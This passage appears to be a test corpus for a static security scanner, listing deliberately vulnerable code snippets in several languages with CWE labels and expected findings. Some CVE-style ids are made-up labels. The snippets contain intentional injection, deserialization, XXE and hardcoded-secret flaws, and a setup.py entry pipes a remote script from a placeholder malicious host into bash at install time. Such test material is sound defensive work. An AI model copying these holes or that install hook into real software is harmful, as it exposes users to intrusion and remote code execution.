const { DOMParser } = require('xmldom');
const app = express();

app.post('/parse', (req, res) => {
  const parser = new DOMParser();
  const doc = parser.parseFromString(req.body.xml, 'text/xml');
  res.json({ root: doc.documentElement.nodeName });
});
""",
        expected_hit=r"CWE-611|XXE|[Ee]xternal [Ee]ntity",
    ),

    CVEEntry(
        cve_id="CVE-2022-UPLOAD-RCE",
        language="javascript",
        cwe="CWE-434",
        description=(
            "Unrestricted file upload Ã¢â‚¬â€ multer handler accepts any file type without "
            "MIME or extension validation, allowing upload of server-side scripts."
        ),
        snippet="""
const express = require('express');
const multer = require('multer');
const upload = multer({ dest: 'uploads/' });
const app = express();

app.post('/upload', upload.single('file'), (req, res) => {
  res.json({ filename: req.file.originalname });
});
""",
        expected_hit=r"CWE-434|[Uu]nrestricted.*upload|[Ff]ile.*upload",
    ),

    CVEEntry(
        cve_id="CVE-2022-PATH-TRAVERSAL-STATIC",
        language="javascript",
        cwe="CWE-22",
        description="Express route passes user-supplied filename to res.sendFile without path validation.",
        snippet="""
const express = require('express');
const path = require('path');
const app = express();

app.get('/download', (req, res) => {
  const filename = req.query.file;
  res.sendFile(filename, { root: '/var/uploads' });
});
""",
        expected_hit=r"CWE-22|[Pp]ath [Tt]raversal|sendFile",
    ),

        CVEEntry(
                cve_id="CVE-2024-JS-HAPI-MISSING-AUTH",
                language="javascript",
                cwe="CWE-862",
                description="Hapi route exposes an admin handler with no `options.auth` protection.",
                snippet="""
const Hapi = require('@hapi/hapi');
const server = Hapi.server();

server.route({
    method: 'GET',
    path: '/admin/users',
    handler: async (request, h) => User.findAll(),
});
""",
                expected_hit=r"JS-024|CWE-862|Hapi route missing authentication",
        ),

        CVEEntry(
                cve_id="CVE-2024-JS-RESTIFY-NO-AUTH",
                language="javascript",
                cwe="CWE-862",
                description="Restify route is defined without any file-scope authorization parser or auth plugin.",
                snippet="""
const restify = require('restify');
const server = restify.createServer();

server.get('/accounts/:id', (req, res, next) => {
    res.send(Account.findByPk(req.params.id));
    return next();
});
""",
                expected_hit=r"JS-025|CWE-862|Restify route missing authorization plugin",
        ),

        CVEEntry(
                cve_id="CVE-2024-JS-TRPC-PUBLIC-MUTATION",
                language="javascript",
                cwe="CWE-285",
                description="tRPC mutation uses `publicProcedure` even though it performs a protected state change.",
                snippet="""
export const appRouter = router({
    updateUser: publicProcedure.mutation(async ({ input, ctx }) => {
        return ctx.db.user.update({ where: { id: input.id }, data: input });
    }),
});
""",
                expected_hit=r"JS-026|CWE-285|tRPC public mutation missing protection",
        ),

        CVEEntry(
                cve_id="CVE-2024-JS-GRAPHQL-NO-AUTH",
                language="javascript",
                cwe="CWE-862",
                description="GraphQL resolver returns protected user data without checking `context.user`.",
                snippet="""
const typeDefs = gql`type Query { user(id: ID!): User }`;
const resolvers = {
    Query: {
        user: async (_parent, args, context) => {
            return db.user.findUnique({ where: { id: args.id } });
        }
    }
};
""",
                expected_hit=r"JS-027|CWE-862|GraphQL resolver missing authentication",
        ),

        CVEEntry(
                cve_id="CVE-2024-JS-GRAPHQL-IDOR",
                language="javascript",
                cwe="CWE-639",
                description="GraphQL resolver uses `args.id` for a resource lookup without ownership scoping.",
                snippet="""
const resolvers = {
    Query: {
        invoice: async (_parent, args, context) => {
            if (!context.user) throw new Error('auth required');
            return prisma.invoice.findUnique({ where: { id: args.id } });
        }
    }
};
const server = new ApolloServer({ resolvers });
""",
                expected_hit=r"JS-028|CWE-639|GraphQL resolver IDOR via args.id",
        ),

    CVEEntry(
        cve_id="CVE-2023-PY-RATE-LIMIT",
        language="python",
        cwe="CWE-307",
        description="Flask login route has no rate-limiting, enabling brute-force attacks.",
        snippet="""
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    if username == 'admin' and password == 'secret':
        return jsonify({'token': 'abc123'})
    return jsonify({'error': 'invalid'}), 401
""",
        expected_hit=r"CWE-307|rate.?limit|brute.?force",
        severity_min="medium",
    ),

    CVEEntry(
        cve_id="CVE-2023-PY-SSTI",
        language="python",
        cwe="CWE-79",
        description=(
            "Server-Side Template Injection via render_template_string with "
            "user-controlled template content."
        ),
        snippet="""
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/render')
def render_page():
    template = request.args.get('template', '')
    return render_template_string(template)
""",
        expected_hit=r"CWE-79|[Tt]emplate [Ii]njection|SSTI|render_template_string",
    ),

    CVEEntry(
        cve_id="CVE-2023-PY-SUBPROCESS-GETOUTPUT",
        language="python",
        cwe="CWE-78",
        description=(
            "subprocess.getoutput() implicitly uses shell=True, enabling command injection "
            "via user-supplied filenames."
        ),
        snippet="""
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/checksum')
def checksum():
    filename = request.args.get('file')
    result = subprocess.getoutput(f'sha256sum {filename}')
    return result
""",
        expected_hit=r"CWE-78|[Cc]ommand [Ii]njection|getoutput",
    ),

    CVEEntry(
        cve_id="CVE-2023-PY-FASTAPI-MISSING-AUTH",
        language="python",
        cwe="CWE-862",
        description=(
            "FastAPI admin route exposes all users without any authentication dependency."
        ),
        snippet="""
from fastapi import FastAPI

app = FastAPI()

@app.get('/admin/users')
async def list_all_users():
    return {'users': []}
""",
        expected_hit=r"CWE-862|[Mm]issing auth|admin",
    ),

    # Ã¢â€â‚¬Ã¢â€â‚¬ Expanded corpus: LDAP, NoSQL, XXE Python, CSRF, JWT, TLS, Go Ã¢â€â‚¬Ã¢â€â‚¬

    CVEEntry(
        cve_id="CVE-2021-LDAP-INJECTION",
        language="python",
        cwe="CWE-90",
        description="LDAP injection via user-supplied filter string.",
        snippet="""
import ldap
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def ldap_search():
    username = request.args.get('user')
    conn = ldap.initialize('ldap://localhost')
    result = conn.search_s('ou=users,dc=example,dc=com', ldap.SCOPE_SUBTREE, f'(uid={username})')
    return str(result)
""",
        expected_hit=r"CWE-90|LDAP|[Ii]njection",
    ),

    CVEEntry(
        cve_id="CVE-2022-NOSQL-INJECTION",
        language="python",
        cwe="CWE-943",
        description="NoSQL injection via unvalidated JSON filter in MongoDB query.",
        snippet="""
from flask import Flask, request
import pymongo

app = Flask(__name__)
client = pymongo.MongoClient()
db = client['users']

@app.route('/find')
def find_user():
    username = request.args.get('user')
    result = db.users.find({'$where': f'this.username == "{username}"'})
    return str(list(result))
""",
        expected_hit=r"CWE-943|NoSQL|[Ii]njection|MongoDB",
    ),

    CVEEntry(
        cve_id="CVE-2022-XXE-PYTHON",
        language="python",
        cwe="CWE-611",
        description="XXE via lxml etree.parse with user-supplied XML.",
        snippet="""
from lxml import etree
from flask import Flask, request

app = Flask(__name__)

@app.route('/parse-xml', methods=['POST'])
def parse_xml():
    xml_data = request.get_data(as_text=True)
    tree = etree.fromstring(xml_data)
    return etree.tostring(tree)
""",
        expected_hit=r"CWE-611|XXE|etree",
    ),

    CVEEntry(
        cve_id="CVE-2022-CSRF-TOKEN",
        language="python",
        cwe="CWE-352",
        description="CSRF Ã¢â‚¬â€ state-changing POST route without CSRF token validation.",
        snippet="""
from flask import Flask, request

app = Flask(__name__)

@app.route('/transfer', methods=['POST'])
def transfer_funds():
    amount = request.form.get('amount')
    to_account = request.form.get('to')
    execute_transfer(to_account, amount)
    return {'status': 'ok'}
""",
        expected_hit=r"CWE-352|CSRF|state.changing",
    ),

    CVEEntry(
        cve_id="CVE-2022-JWT-ALG-NONE",
        language="python",
        cwe="CWE-345",
        description="JWT verification without specifying allowed algorithms (alg=none attack).",
        snippet="""
import jwt
from flask import Flask, request

app = Flask(__name__)

@app.route('/verify')
def verify_token():
    token = request.headers.get('Authorization', '').replace('Bearer ', '')
    try:
        payload = jwt.decode(token, verify=False)
        return {'user': payload.get('sub')}
    except Exception:
        return {'error': 'invalid'}, 401
""",
        expected_hit=r"CWE-345|JWT|verify.*False|alg.*none",
    ),

    CVEEntry(
        cve_id="CVE-2022-TLS-VERIFY-FALSE",
        language="python",
        cwe="CWE-295",
        description="TLS certificate verification disabled in requests call.",
        snippet="""
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route('/proxy')
def proxy_request():
    url = request.args.get('url')
    resp = requests.get(url, verify=False)
    return resp.text
""",
        expected_hit=r"CWE-295|TLS|verify.*False|SSL",
    ),

    CVEEntry(
        cve_id="CVE-2022-COOKIE-SECURE-FALSE",
        language="python",
        cwe="CWE-614",
        description="Session cookie set without Secure flag, allowing transmission over HTTP.",
        snippet="""
from flask import Flask, session

app = Flask(__name__)
app.config['SECRET_KEY'] = 'dev-key'

@app.route('/login')
def login():
    session['user_id'] = 42
    return {'status': 'logged_in'}
""",
        expected_hit=r"CWE-614|cookie.*secure|Secure.*flag",
        severity_min="medium",
    ),

    CVEEntry(
        cve_id="CVE-2022-GRAPHQL-INTROSPECTION",
        language="javascript",
        cwe="CWE-200",
        description="GraphQL introspection enabled in production, exposing schema.",
        snippet="""
const { ApolloServer, gql } = require('apollo-server');

const typeDefs = gql`
  type Query { users: [User] }
  type User { id: ID, email: String, ssn: String }
`;

const server = new ApolloServer({
  typeDefs,
  introspection: true,
  playground: true,
});

server.listen(4000);
""",
        expected_hit=r"CWE-200|introspection|GraphQL|information.exposure",
        severity_min="medium",
    ),

    CVEEntry(
        cve_id="CVE-2022-DOS-BOMB",
        language="python",
        cwe="CWE-400",
        description="Unbounded resource consumption Ã¢â‚¬â€ zip bomb via extracted file.",
        snippet="""
import zipfile
from flask import Flask, request

app = Flask(__name__)

@app.route('/extract', methods=['POST'])
def extract_archive():
    archive = request.files.get('file')
    with zipfile.ZipFile(archive, 'r') as zf:
        zf.extractall('/tmp/extracted')
    return {'status': 'ok'}
""",
        expected_hit=r"CWE-400|unbounded|zip.bomb|resource",
        severity_min="medium",
    ),

    CVEEntry(
        cve_id="CVE-2023-PY-TRACEBACK-LEAK",
        language="python",
        cwe="CWE-200",
        description="Debug mode exposes full tracebacks to users in production.",
        snippet="""
from flask import Flask

app = Flask(__name__)
app.config['DEBUG'] = True

@app.route('/crash')
def crash():
    raise ValueError('secret database password: SuperSecret123')
""",
        expected_hit=r"CWE-200|debug.*True|traceback|information.exposure",
    ),

    CVEEntry(
        cve_id="CVE-2023-PY-UNSAFE-REFLECTION",
        language="python",
        cwe="CWE-470",
        description="Unsafe use of getattr with user-controlled attribute name.",
        snippet="""
from flask import Flask, request

app = Flask(__name__)

class AdminPanel:
    def delete_all_users(self):
        return 'done'

panel = AdminPanel()

@app.route('/admin/<action>')
def admin_action(action):
    method = getattr(panel, action, None)
    if method:
        return method()
    return {'error': 'unknown action'}
""",
        expected_hit=r"CWE-470|getattr|reflection|unsafe",
    ),

    CVEEntry(
        cve_id="CVE-2023-GO-CMD-INJECTION",
        language="go",
        cwe="CWE-78",
        description="Go command injection via os/exec with user-supplied arguments.",
        snippet="""
package main

import (
    "net/http"
    "os/exec"
)

func executeHandler(w http.ResponseWriter, r *http.Request) {
    cmd := r.URL.Query().Get("cmd")
    out, _ := exec.Command("sh", "-c", cmd).Output()
    w.Write(out)
}

func main() {
    http.HandleFunc("/exec", executeHandler)
    http.ListenAndServe(":8080", nil)
}
""",
        expected_hit=r"CWE-78|exec\.Command|command.injection",
    ),

    CVEEntry(
        cve_id="CVE-2023-GO-SQL-INJECTION",
        language="go",
        cwe="CWE-89",
        description="Go SQL injection via fmt.Sprintf with user input.",
        snippet="""
package main

import (
    "database/sql"
    "fmt"
    "net/http"
)

var db *sql.DB

func searchHandler(w http.ResponseWriter, r *http.Request) {
    query := r.URL.Query().Get("q")
    sqlQuery := fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", query)
    rows, _ := db.Query(sqlQuery)
    defer rows.Close()
}
""",
        expected_hit=r"CWE-89|fmt\.Sprintf|SQL.injection",
    ),

    CVEEntry(
        cve_id="CVE-2023-GO-MISSING-AUTH",
        language="go",
        cwe="CWE-862",
        description="Go admin HTTP handler without authentication middleware.",
        snippet="""
package main

import "net/http"

func adminHandler(w http.ResponseWriter, r *http.Request) {
    w.Write([]byte(`{"users": []}`))
}

func main() {
    http.HandleFunc("/admin/users", adminHandler)
    http.ListenAndServe(":8080", nil)
}
""",
        expected_hit=r"CWE-862|missing.auth|admin",
    ),

    CVEEntry(
        cve_id="CVE-2024-JAVA-SPRING-MISSING-AUTH",
        language="java",
        cwe="CWE-862",
        description="Spring Boot admin endpoint returns data without @PreAuthorize, @Secured, or an authenticated principal check.",
        snippet="""
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class AdminController {
    @GetMapping("/admin/users")
    public String listUsers() {
        return "[]";
    }
}
""",
        expected_hit=r"CWE-862|missing authentication|Spring route",
    ),

    CVEEntry(
        cve_id="CVE-2024-JAVA-SQLI",
        language="java",
        cwe="CWE-89",
        description="JDBC query string is built with attacker-controlled input using string concatenation.",
        snippet="""
import java.sql.Connection;
import java.sql.Statement;
import javax.servlet.http.HttpServletRequest;

public class UserController {
    public void search(HttpServletRequest request, Connection conn) throws Exception {
        String name = request.getParameter("name");
        Statement stmt = conn.createStatement();
        stmt.executeQuery("SELECT * FROM users WHERE name = '" + name + "'");
    }
}
""",
        expected_hit=r"CWE-89|Dynamic SQL|SQL",
    ),

    CVEEntry(
        cve_id="CVE-2024-CSHARP-MISSING-AUTH",
        language="csharp",
        cwe="CWE-862",
        description="ASP.NET Core controller exposes an administrative route without [Authorize].",
        snippet="""
using Microsoft.AspNetCore.Mvc;

[ApiController]
[Route("admin")]
public class AdminController : ControllerBase
{
    [HttpGet("users")]
    public IActionResult Users()
    {
        return Ok(new[] { "alice" });
    }
}
""",
        expected_hit=r"CWE-862|missing \[Authorize\]|ASP.NET action",
    ),

    CVEEntry(
        cve_id="CVE-2024-CSHARP-SQLI",
        language="csharp",
        cwe="CWE-89",
        description="SqlCommand text uses interpolation with request-derived input instead of parameters.",
        snippet="""
using Microsoft.AspNetCore.Mvc;
using System.Data.SqlClient;

[ApiController]
[Route("users")]
public class UsersController : ControllerBase
{
    [HttpGet("search")]
    public IActionResult Search(string id)
    {
        var cmd = new SqlCommand($"SELECT * FROM Users WHERE Id = '{id}'");
        return Ok();
    }
}
""",
        expected_hit=r"CWE-89|Dynamic SQL|SqlCommand",
    ),

    CVEEntry(
        cve_id="CVE-2023-LDAP-PY-INJECT",
        language="python",
        cwe="CWE-90",
        description="LDAP filter constructed by string concatenation with user-supplied username allows LDAP injection.",
        snippet="""\
import ldap

def authenticate(username, password):
    conn = ldap.initialize("ldap://corp.example.com")
    conn.simple_bind_s("cn=admin,dc=example,dc=com", "adminpassword")
    # Vulnerable: user input directly concatenated into LDAP filter
    search_filter = "(&(uid=" + username + ")(password=" + password + "))"
    result = conn.search_s("dc=example,dc=com", ldap.SCOPE_SUBTREE, search_filter)
    return bool(result)
""",
        expected_hit=r"CWE-90|LDAP|inject",
        sink_line=7,
    ),

    # LDAP Injection Ã¢â‚¬â€ Python ldap3 library (CWE-90)
    CVEEntry(
        cve_id="CVE-2023-LDAP3-PY-INJECT",
        language="python",
        cwe="CWE-90",
        description="ldap3 search_filter built from user input without escaping allows LDAP injection.",
        snippet="""\
from flask import request
from ldap3 import Server, Connection, SUBTREE

def find_user():
    username = request.args.get("username")
    server = Server("ldap://internal.example.com")
    conn = Connection(server, "cn=app,dc=example,dc=com", "pass")
    conn.bind()
    # Vulnerable: user input interpolated directly into the search_filter keyword
    conn.search(search_filter=f"(sAMAccountName={username})", search_base="dc=example,dc=com", search_scope=SUBTREE)
    return conn.entries
""",
        expected_hit=r"CWE-90|LDAP|inject",
        sink_line=8,
    ),

    # JWT None-Algorithm Attack Ã¢â‚¬â€ PyJWT (CWE-347)
    CVEEntry(
        cve_id="CVE-2022-JWT-NONE-PY",
        language="python",
        cwe="CWE-347",
        description="PyJWT decode called without algorithm specification, accepting none-algorithm tokens.",
        snippet="""\
import jwt

def verify_token(token, key):
    # Vulnerable: explicitly accepts the none algorithm
    payload = jwt.decode(token, key, algorithms=["none"])
    return payload
""",
        expected_hit=r"CWE-347|algorithm|JWT",
        sink_line=5,
    ),

    # JWT Weak Secret Ã¢â‚¬â€ PyJWT (CWE-798)
    CVEEntry(
        cve_id="CVE-2023-JWT-WEAK-SECRET-PY",
        language="python",
        cwe="CWE-798",
        description="JWT token signed with hardcoded weak secret 'secret'.",
        snippet="""\
import jwt

SECRET = "secret"

def create_token(user_id):
    payload = {"sub": user_id, "role": "user"}
    # Vulnerable: hardcoded trivially guessable secret
    token = jwt.encode(payload, "secret", algorithm="HS256")
    return token
""",
        expected_hit=r"CWE-798|hardcoded|secret|JWT",
        sink_line=8,
    ),

    # Second-Order SQL Injection Ã¢â‚¬â€ Django raw() (CWE-89)
    CVEEntry(
        cve_id="CVE-2023-SECOND-ORDER-SQLI",
        language="python",
        cwe="CWE-89",
        description="Username stored in DB then re-used in raw SQL query, enabling second-order injection.",
        snippet="""\
from flask import request
from django.db import connection

def get_user_profile():
    username = request.args.get("username")
    # Vulnerable: raw SQL reuses the request value directly
    with connection.cursor() as cur:
        cur.execute(f"SELECT * FROM profiles WHERE username = '{username}'")
        return cur.fetchone()
""",
        expected_hit=r"CWE-89|SQL|inject|second.order|stored",
        sink_line=10,
    ),

    # Cloud Secret Hardcoded Ã¢â‚¬â€ boto3/AWS (CWE-798)
    CVEEntry(
        cve_id="CVE-2023-AWS-HARDCODED-KEY",
        language="python",
        cwe="CWE-798",
        description="AWS access key and secret hardcoded in source code.",
        snippet="""\
import boto3

# Vulnerable: hardcoded AWS credentials
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

client = boto3.client(
    "s3",
    aws_access_key_id=AWS_ACCESS_KEY_ID,
    aws_secret_access_key=AWS_SECRET_ACCESS_KEY,
)
""",
        expected_hit=r"CWE-798|hardcoded|AWS|credential",
        sink_line=4,
    ),

    # S3 Public ACL Misconfiguration (CWE-732)
    CVEEntry(
        cve_id="CVE-2023-S3-PUBLIC-ACL",
        language="python",
        cwe="CWE-732",
        description="S3 bucket created with public-read ACL making all objects publicly accessible.",
        snippet="""\
import boto3

s3 = boto3.client("s3")

def create_public_bucket(bucket_name):
    # Vulnerable: public-read ACL exposes all bucket contents
    s3.create_bucket(
        Bucket=bucket_name,
        ACL="public-read",
    )
""",
        expected_hit=r"CWE-732|public|ACL|S3",
        sink_line=8,
    ),

    # Extended Deserialization Ã¢â‚¬â€ jsonpickle (CWE-502)
    CVEEntry(
        cve_id="CVE-2023-JSONPICKLE-RCE",
        language="python",
        cwe="CWE-502",
        description="jsonpickle.decode() on user-supplied input enables arbitrary class instantiation (RCE).",
        snippet="""\
import jsonpickle
from flask import request, jsonify

def deserialize_object():
    data = request.json.get("payload")
    # Vulnerable: jsonpickle decodes py/object tags and instantiates arbitrary classes
    obj = jsonpickle.decode(data)
    return jsonify({"result": str(obj)})
""",
        expected_hit=r"CWE-502|jsonpickle|deseri",
        sink_line=7,
    ),

    # Extended Deserialization Ã¢â‚¬â€ PyYAML unsafe load (CWE-502)
    CVEEntry(
        cve_id="CVE-2023-PYYAML-RCE",
        language="python",
        cwe="CWE-502",
        description="yaml.load() with default Loader executes arbitrary Python via !!python/object tags.",
        snippet="""\
import yaml
from flask import request

def parse_config():
    user_yaml = request.data.decode("utf-8")
    # Vulnerable: yaml.load with default Loader can execute Python code
    config = yaml.load(user_yaml)
    return config
""",
        expected_hit=r"CWE-502|yaml.load|safe",
        sink_line=7,
    ),

    # API Key Hardcoded in Source (CWE-798)
    CVEEntry(
        cve_id="CVE-2023-APIKEY-HARDCODED",
        language="python",
        cwe="CWE-798",
        description="Third-party API key hardcoded as a module-level constant.",
        snippet="""\
import stripe
import os
stripe.api_key = "sk_live_a1b2c3d4e5f6g7h"
def charge():
    stripe.Charge.create(amount=1000)
""",
        expected_hit=r"CWE-798|hardcoded|API.?key|credential",
        sink_line=2,
    ),

    # TOCTOU Ã¢â‚¬â€ tempfile.mktemp() (CWE-377)
    CVEEntry(
        cve_id="CVE-2023-TOCTOU-MKTEMP",
        language="python",
        cwe="CWE-377",
        description="tempfile.mktemp() returns a path without atomically creating the file, allowing symlink races.",
        snippet="""\
import tempfile
import os

def process_upload(data):
    # Vulnerable: mktemp only returns a name, a race exists before open()
    tmp_path = tempfile.mktemp(suffix=".tmp")
    with open(tmp_path, "wb") as f:
        f.write(data)
    return tmp_path
""",
        expected_hit=r"CWE-377|mktemp|TOCTOU|race",
        sink_line=6,
    ),

    # TOCTOU Ã¢â‚¬â€ os.path.exists() before open (CWE-362)
    CVEEntry(
        cve_id="CVE-2023-TOCTOU-EXISTS",
        language="python",
        cwe="CWE-362",
        description="os.path.exists() check before file open creates a TOCTOU race condition.",
        snippet="""\
import os
from flask import Flask, request

app = Flask(__name__)

@app.route("/write")
def write_config():
    path = request.args.get("path")
    # Vulnerable: check-then-open race on user-controlled path
    if os.path.exists(path):
        return "exists"
    with open(path, "w") as f:
        f.write("data")
    return "ok"
""",
        expected_hit=r"CWE-362|TOCTOU|race|exists",
        sink_line=5,
    ),

    # Handlebars SSTI (CWE-94) Ã¢â‚¬â€ Node.js
    CVEEntry(
        cve_id="CVE-2023-HANDLEBARS-SSTI",
        language="javascript",
        cwe="CWE-94",
        description="Handlebars.compile() called with user-supplied template string enables arbitrary code execution.",
        snippet="""\
const Handlebars = require('handlebars');
const express = require('express');
const app = express();

app.post('/render', (req, res) => {
  // Vulnerable: compiling user-controlled request body directly
  const compiled = Handlebars.compile(req.body.template);
  const output = compiled({ user: req.body.name });
  res.send(output);
});
""",
        expected_hit=r"CWE-94|SSTI|Handlebars|template",
        sink_line=8,
    ),

    # JWT None-Algorithm Ã¢â‚¬â€ Node.js (CWE-347)
    CVEEntry(
        cve_id="CVE-2022-JWT-NONE-JS",
        language="javascript",
        cwe="CWE-347",
        description="jsonwebtoken.verify() accepts none-algorithm tokens when algorithms option is not specified.",
        snippet="""\
const jwt = require('jsonwebtoken');

function verifyToken(token, secret) {
  // Vulnerable: explicitly allows the none algorithm
  const payload = jwt.verify(token, secret, { algorithms: ['none'] });
  return payload;
}
""",
        expected_hit=r"CWE-347|algorithm|JWT|none",
        sink_line=5,
    ),

    # Supply Chain Ã¢â‚¬â€ setup.py shell execution (CWE-494)
    CVEEntry(
        cve_id="CVE-2023-SUPPLY-CHAIN-SETUPPY",
        language="python",
        cwe="CWE-494",
        description="setup.py executes a shell command during package installation, enabling supply-chain code execution.",
        snippet="""\
from setuptools import setup
import os
import subprocess

# Vulnerable: shell command executed at install time
os.system("curl -s https://malicious.example.com/payload.sh | bash")

setup(
    name="example-package",
    version="1.0.0",
)
""",
        expected_hit=r"CWE-494|supply.chain|setup.py|os.system",
        sink_line=6,
    ),

    # Template Engine SSTI — Jinja2 from_string user input (CWE-94)
    CVEEntry(
        cve_id="CVE-2024-TEMPLATE-ENGINES-PY",
        language="python",
        cwe="CWE-94",
        description="Jinja2 Environment.from_string() compiles a user-controlled template body (server-side template injection).",
        snippet="""\
from flask import request
from jinja2 import Environment

def render_user_template():
    env = Environment()
    # Vulnerable: user-controlled template source compiled at runtime
    tmpl = env.from_string(request.args.get("template"))
    return tmpl.render(user="alice")
""",
        expected_hit=r"CWE-94|template|SSTI|jinja",
        sink_line=7,
    ),
    # ------------------------------------------------------------------ #
    # ── Java CVEs ──────────────────────────────────────────────────────
    # ------------------------------------------------------------------ #

    # Java Command Injection — Runtime.exec via ProcessBuilder (CWE-78)
    CVEEntry(
        cve_id="CVE-2024-JAVA-CMD-INJECT-PB",
        language="java",
        cwe="CWE-78",
        description="ProcessBuilder used with unsanitized user input, leading to OS command injection.",
        snippet="""\
import java.io.*;
public class FileManager {
    public void deleteFile(String filename) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("rm", "-rf", filename);
        pb.start();
    }
}
""",
        expected_hit=r"CWE-78|command.injection|ProcessBuilder",
        sink_line=4,
    ),

    # Java Command Injection — Runtime.exec (CWE-78)
    CVEEntry(
        cve_id="CVE-2024-JAVA-CMD-INJECT-EXEC",
        language="java",
        cwe="CWE-78",
        description="Runtime.getRuntime().exec() with unsanitized user input.",
        snippet="""\
import java.io.*;
public class AdminPanel {
    public void execute(String cmd) throws Exception {
        Runtime.getRuntime().exec(cmd);
    }
}
""",
        expected_hit=r"CWE-78|command.injection|Runtime",
        sink_line=4,
    ),

    # Java SQL Injection — JDBC Statement concatenation (CWE-89)
    CVEEntry(
        cve_id="CVE-2024-JAVA-SQLI-JDBC",
        language="java",
        cwe="CWE-89",
        description="SQL injection via Statement.executeQuery() with string concatenation.",
        snippet="""\
import java.sql.*;
public class UserDAO {
    public void lookup(String username) throws Exception {
        Statement stmt = DriverManager.getConnection("jdbc:h2:mem:").createStatement();
        stmt.executeQuery("SELECT * FROM users WHERE name = '" + username + "'");
    }
}
""",
        expected_hit=r"CWE-89|SQL.injection|executeQuery",
        sink_line=5,
    ),

    # Java Path Traversal — File with user input (CWE-22)
    CVEEntry(
        cve_id="CVE-2024-JAVA-PATH-TRAV",
        language="java",
        cwe="CWE-22",
        description="Path traversal via java.io.File with unsanitized user-controlled filename.",
        snippet="""\
import java.io.*;
public class FileDownload {
    public void download(String file) throws Exception {
        File f = new File("/var/data/" + file);
        FileInputStream fis = new FileInputStream(f);
    }
}
""",
        expected_hit=r"CWE-22|path.traversal|File",
        sink_line=4,
    ),

    # Java SSRF — HttpURLConnection (CWE-918)
    CVEEntry(
        cve_id="CVE-2024-JAVA-SSRF-URL",
        language="java",
        cwe="CWE-918",
        description="SSRF via URL.openConnection() with unsanitized user-controlled URL.",
        snippet="""\
import java.net.*;
import javax.servlet.http.*;
public class T extends HttpServlet {
  public void doGet(HttpServletRequest req, HttpServletResponse res) throws Exception {
    String url = req.getParameter("url");
    URL u = new URL(url);
    HttpURLConnection c = (HttpURLConnection)u.openConnection();
    c.connect();
  }
}
""",
        expected_hit=r"CWE-918|SSRF|URL",
        sink_line=6,
    ),

    # Java Open Redirect — sendRedirect (CWE-601)
    CVEEntry(
        cve_id="CVE-2024-JAVA-REDIRECT",
        language="java",
        cwe="CWE-601",
        description="Open redirect via HttpServletResponse.sendRedirect() with unsanitized URL.",
        snippet="""\
import javax.servlet.http.*;
public class T extends HttpServlet {
  protected void doGet(HttpServletRequest req, HttpServletResponse res) throws Exception {
    String target = req.getParameter("url");
    res.sendRedirect(target);
  }
}
""",
        expected_hit=r"CWE-601|redirect|sendRedirect",
        severity_min="medium",
        sink_line=4,
    ),

    # Java XSS — Response write without encoding (CWE-79)
    CVEEntry(
        cve_id="CVE-2024-JAVA-XSS-WRITE",
        language="java",
        cwe="CWE-79",
        description="XSS via response.getWriter().write() with unsanitized user input.",
        snippet="""\
import javax.servlet.http.*;
import java.io.*;
public class T extends HttpServlet {
  protected void doGet(HttpServletRequest req, HttpServletResponse res) throws Exception {
    String name = req.getParameter("name");
    res.getWriter().write("<h1>Hello " + name + "</h1>");
  }
}
""",
        expected_hit=r"CWE-79|XSS|cross.site",
        sink_line=5,
    ),

    # Java Deserialization — ObjectInputStream (CWE-502)
    CVEEntry(
        cve_id="CVE-2024-JAVA-DESER",
        language="java",
        cwe="CWE-502",
        description="Unsafe deserialization via ObjectInputStream.readObject().",
        snippet="""\
import java.io.*;
public class DeserializeServlet extends HttpServlet {
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(req.getInputStream());
        Object obj = ois.readObject();
    }
}
""",
        expected_hit=r"CWE-502|deserialization|readObject",
        sink_line=4,
    ),

    # Java Hardcoded Secret (CWE-798)
    CVEEntry(
        cve_id="CVE-2024-JAVA-HARDCODE",
        language="java",
        cwe="CWE-798",
        description="Hardcoded API secret key in Java source.",
        snippet="""\
public class Config {
    private static final String secret = "sk-live-a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6";
    public String get() { return secret; }
}
""",
        expected_hit=r"CWE-798|hardcoded|secret",
        sink_line=2,
    ),

    # Java Weak Crypto — MD5 (CWE-327)
    CVEEntry(
        cve_id="CVE-2024-JAVA-MD5",
        language="java",
        cwe="CWE-327",
        description="Use of weak MD5 MessageDigest for password hashing.",
        snippet="""\
import java.security.*;
public class PasswordHasher {
    public String hash(String password) throws Exception {
        MessageDigest md = MessageDigest.getInstance("MD5");
        byte[] hash = md.digest(password.getBytes());
        return new String(hash);
    }
}
""",
        expected_hit=r"CWE-327|MD5|weak.crypto",
        sink_line=4,
    ),

    # ------------------------------------------------------------------ #
    # ── C# CVEs ────────────────────────────────────────────────────────
    # ------------------------------------------------------------------ #

    # C# Command Injection — Process.Start (CWE-78)
    CVEEntry(
        cve_id="CVE-2024-CS-CMD-INJECT",
        language="csharp",
        cwe="CWE-78",
        description="OS command injection via Process.Start with unsanitized user input.",
        snippet="""\
using System.Diagnostics;
public class CommandHandler {
    public void Run(string cmd) {
        Process.Start(cmd);
    }
}
""",
        expected_hit=r"CWE-78|command|Process.Start",
        sink_line=4,
    ),

    # C# SQL Injection — SqlCommand (CWE-89)
    CVEEntry(
        cve_id="CVE-2024-CS-SQLI",
        language="csharp",
        cwe="CWE-89",
        description="SQL injection via SqlCommand with string concatenation.",
        snippet="""\
using System.Data.SqlClient;
public class UserRepo {
    public void Lookup(string username) {
        var conn = new SqlConnection("Server=localhost;Database=test;");
        var cmd = new SqlCommand("SELECT * FROM users WHERE name = '" + username + "'", conn);
        conn.Open();
        cmd.ExecuteReader();
    }
}
""",
        expected_hit=r"CWE-89|SQL|SqlCommand",
        sink_line=5,
    ),

    # C# Path Traversal — File.ReadAllText (CWE-22)
    CVEEntry(
        cve_id="CVE-2024-CS-PATH-TRAV",
